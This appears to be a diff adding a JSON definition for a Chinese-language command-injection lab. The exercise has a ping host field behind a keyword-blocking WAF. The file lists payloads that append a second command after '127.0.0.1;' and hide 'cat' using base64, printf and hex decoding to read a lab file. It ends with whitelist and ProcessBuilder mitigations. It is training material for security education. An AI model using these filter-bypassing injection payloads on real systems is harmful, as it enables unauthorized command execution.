@@ -1,0 +1,90 @@
+{
+  "context": "rce_ping_c2",
+  "title": "命令注入 · C2（自解码）",
+  "goal": "绕过关键字过滤，使用 Base64、Printf、十六进制解码执行命令",
+  "vuln": {
+    "summary": "VULN：WAF 拦截 cat、passwd，但未拦截解码函数",
+    "impact": [
+      "命令注入：攻击者可以通过解码绕过关键字过滤",
+      "高级绕过：使用 Base64、Printf、十六进制解码"
+    ],
+    "waf": {
+      "blocked_keywords": ["cat", "passwd"],
+      "description": "WAF 拦截 cat、passwd"
+    }
+  },
+  "exploit": {
+    "steps": [
+      {
+        "step": 1,
+        "title": "测试 WAF 拦截",
+        "description": "尝试使用被拦截的关键字",
+        "payload": "127.0.0.1; cat /opt/lab/hosts",
+        "expected": "WAF 拦截提示"
+      },
+      {
+        "step": 2,
+        "title": "使用 Base64 解码",
+        "description": "使用 base64 -d 解码命令",
+        "payload": "127.0.0.1;$(echo Y2F0IC9vcHQvbGFiL2hvc3Rz | base64 -d)",
+        "expected": "看到 /opt/lab/hosts 文件内容"
+      },
+      {
+        "step": 3,
+        "title": "使用 Printf 还原",
+        "description": "使用 printf 输出十六进制字符还原命令",
+        "payload": "127.0.0.1;$(printf '\\x63\\x61\\x74')/opt/lab/hosts",
+        "expected": "看到 /opt/lab/hosts 文件内容"
+      },
+      {
+        "step": 4,
+        "title": "使用十六进制解码",
+        "description": "使用 echo -e 输出十六进制字符还原命令",
+        "payload": "127.0.0.1;$(echo -e \"\\x63\\x61\\x74\")/opt/lab/hosts",
+        "expected": "看到 /opt/lab/hosts 文件内容"
+      }
+    ],
+    "payloads": {
+      "base64": [
+        "127.0.0.1;$(echo Y2F0IC9vcHQvbGFiL2hvc3Rz | base64 -d)",
+        "127.0.0.1;`echo Y2F0IC9vcHQvbGFiL2hvc3Rz | base64 -d`"
+      ],
+      "printf": [
+        "127.0.0.1;$(printf '\\x63\\x61\\x74')/opt/lab/hosts",
+        "127.0.0.1;`printf '\\x63\\x61\\x74'`/opt/lab/hosts"
+      ],
+      "hex": [
+        "127.0.0.1;$(echo -e \"\\x63\\x61\\x74\")/opt/lab/hosts",
+        "127.0.0.1;`echo -e \"\\x63\\x61\\x74\"`/opt/lab/hosts"
+      ]
+    }
+  },
+  "mitigation": {
+    "title": "修复建议",
+    "approaches": [
+      {
+        "name": "白名单验证",
+        "description": "只允许 IP 地址格式，拒绝其他所有输入",
+        "code": {
+          "language": "java",
+          "snippet": "if (!host.matches(\"^[0-9.]+$\")) {\n    throw new IllegalArgumentException(\"Invalid host\");\n}"
+        }
+      },
+      {
+        "name": "参数化执行",
+        "description": "使用 ProcessBuilder 参数数组，避免 shell 解析"
+      }
+    ]
+  },
+  "tips": [
+    "Base64 编码：echo 'cat /opt/lab/hosts' | base64",
+    "Printf 十六进制：printf '\\x63\\x61\\x74' 输出 cat",
+    "Echo 十六进制：echo -e \"\\x63\\x61\\x74\" 输出 cat",
+    "解码绕过关键字过滤，但仍然需要白名单验证"
+  ],
+  "common_mistakes": [
+    "使用了被拦截的关键字",
+    "Base64 编码错误或忘记解码",
+    "十六进制字符转义错误"
+  ]
+}
